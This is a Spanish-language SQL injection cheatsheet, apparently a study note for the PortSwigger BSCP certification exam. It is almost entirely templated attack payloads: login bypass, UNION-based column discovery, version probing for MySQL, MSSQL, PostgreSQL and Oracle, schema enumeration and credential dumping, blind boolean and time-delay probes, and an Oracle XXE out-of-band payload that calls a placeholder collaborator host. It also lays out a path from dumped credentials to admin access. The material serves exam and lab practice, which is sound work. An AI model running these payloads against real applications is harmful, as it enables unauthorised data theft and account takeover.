---
tipo: cheatsheet
vuln: sqli
tags: [bscp, tipo/cheatsheet, vuln/sqli]
relacionada: "[[SQL-Injection]]"
---

# CS · SQL Injection

## Flujo repetible
1. Inyecta una comilla en {{PARAM}} y observa error/cambio.
2. Determina el contexto (string vs numérico) y el motor.
3. Elige técnica: in-band (UNION) > error-based > blind boolean > blind time.
4. Enumera esquema y extrae credenciales de {{TARGET_USER}}.
5. Escala: login como admin → objetivo del examen.

## Detección
```sql
-- Detección
'                      -- rompe la query
' OR '1'='1            -- respuesta distinta => inyectable
```

## Plantillas de payload
```sql
-- Bypass de login (plantilla)
{{TARGET_USER}}'--
' OR 1=1--
```
```sql
-- Nº de columnas y columna de texto
' ORDER BY {{N}}--
' UNION SELECT NULL,...,NULL--          -- {{N}} NULLs
' UNION SELECT 'a',NULL--               -- localizar columna string
```
```sql
-- Versión del motor (según cuál responda)
' UNION SELECT @@version,NULL--                    -- MySQL/MSSQL
' UNION SELECT version(),NULL--                    -- PostgreSQL
' UNION SELECT banner,NULL FROM v$version--        -- Oracle (usa FROM dual)
```
```sql
-- Enumeración y extracción
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='{{TABLE}}'--
' UNION SELECT username,password FROM {{TABLE}}--
```
```sql
-- Blind booleana / substring
' AND SUBSTRING((SELECT password FROM {{TABLE}} WHERE username='{{TARGET_USER}}'),{{N}},1)='a
```
```sql
-- Blind por tiempo (elige motor)
'; IF (1=1) WAITFOR DELAY '0:0:5'--                 -- MSSQL
' OR IF(1=1,SLEEP(5),0)--                           -- MySQL
'; SELECT pg_sleep(5)--                             -- PostgreSQL
' AND 1=(SELECT 1 FROM PG_SLEEP(5))--               -- PostgreSQL
```
```sql
-- OOB / exfil (Oracle) ⚠️
' UNION SELECT extractvalue(xmltype('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % x SYSTEM "http://{{COLLAB}}/">%x;]>'),'/l') FROM dual--
```

## Escalada al objetivo
Volcar credenciales de {{TARGET_USER}} → login → panel admin → leer {{SECRET_PATH}} / borrar usuario.

## Checklist
- [ ] Probé comilla simple y doble en {{PARAM}}
- [ ] Identifiqué el motor
- [ ] Determiné nº de columnas y columna de texto
- [ ] Enumeré tablas/columnas o usé blind
- [ ] Escalé a acceso admin

## Referencias
- **Sintaxis por motor (Oracle/MSSQL/PostgreSQL/MySQL)** → [[SQLi-Referencia-Motores]]
- https://portswigger.net/web-security/sql-injection
- https://portswigger.net/web-security/sql-injection/cheat-sheet
